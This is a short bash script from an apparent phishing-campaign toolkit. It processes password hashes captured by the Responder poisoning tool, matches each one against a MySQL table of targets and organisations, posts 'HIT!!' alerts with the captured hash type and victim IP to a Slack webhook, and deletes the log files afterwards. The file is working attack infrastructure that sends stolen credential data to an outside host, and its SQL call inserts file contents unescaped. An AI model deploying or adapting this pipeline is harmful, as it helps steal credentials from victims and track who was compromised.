#!/bin/bash

SlackURL="https://hooks.slack.com/services/YOUR_SLACK_WEBHOOK_URL_HERE"
SlackChannel="#YOUR_SLACK_CHANNEL_HERE"
APIResultsURL="https://YOUR_API_DOMAIN_HERE/phishingdocs/results"

files=$(cd /home/ubuntu/Responder/logs && ls *.txt | awk '{print $1}');

IFS='
'
count=0
for item in $files
do
  file=$item
  count=$((count+1))
  IP=$(echo $item | cut -d "-" -f 4 | cut -d "." -f 1,2,3,4);
  Module=$(echo $item | cut -d "-" -f 3);
  HashType=$(echo $item | cut -d "-" -f 2);

  Hashes=$(cat /home/ubuntu/Responder/logs/$file);

  Query=$(mysql -u root phishingdocs -se "CALL MatchHashes('$IP','$Hashes');");

  Target=$(echo $Query | cut -f 1);
  Org=$(echo $Query | cut -f 2);

  message=$(echo "> *HIT!!* Captured a" $HashType "hash ("$Module") for" $Target "at" $Org "(<"$APIResultsURL"|"$IP">)");

  if [ -z "$Target" ] || [ -z "$Org" ]
  then
      message=$(echo "> Captured an out of scope" $HashType "hash ("$Module") at" $IP);
  fi

  curl -s -X POST --data-urlencode 'payload={"channel": "'$SlackChannel'", "username": "HashBot", "text": "'$message'", "icon_emoji": ":hash:"}' $SlackURL

  rm /home/ubuntu/Responder/logs/$file;

done
